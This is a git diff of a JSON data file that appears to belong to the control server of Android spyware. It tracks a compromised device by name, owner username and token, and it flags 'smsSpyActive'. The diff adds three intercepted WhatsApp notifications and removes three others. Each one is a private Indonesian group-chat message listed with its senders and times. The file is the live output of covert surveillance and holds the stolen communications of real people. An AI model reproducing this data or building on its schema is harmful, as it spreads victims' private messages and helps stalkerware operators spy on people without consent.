@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003465600,
+    "lastSeen": 1776003468750,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (4 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "😭😭",
+        "time": "12/04 21:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003470491
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎3 pesan baru",
+        "time": "12/04 21:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003467911
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (3 pesan): ~ ชาฟิรา__🦢🧜‍♀️",
+        "content": "WAHAHAHA HIDUP KLIAN KEBAGIAN WHEN WHEN AJA🤣😢😄💔",
+        "time": "12/04 21:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003467798
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (2 pesan): ~ '`'foreigners'`",
@@ -4099,30 +4123,6 @@
         "time": "12/04 00:15",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927730310
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ m!kel",
-        "content": "bnyk bangt tu duit klh gw",
-        "time": "12/04 00:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927730206
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎2 pesan baru",
-        "time": "12/04 00:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927708140
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (2 pesan): ~ regàcmèldlv/𝐂𝐈𝐓𝐄𝐍𝟗/ROR",
-        "content": "bentar lgi drama",
-        "time": "12/04 00:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927708131
       }
     ],
     "galleryPhotos": [],
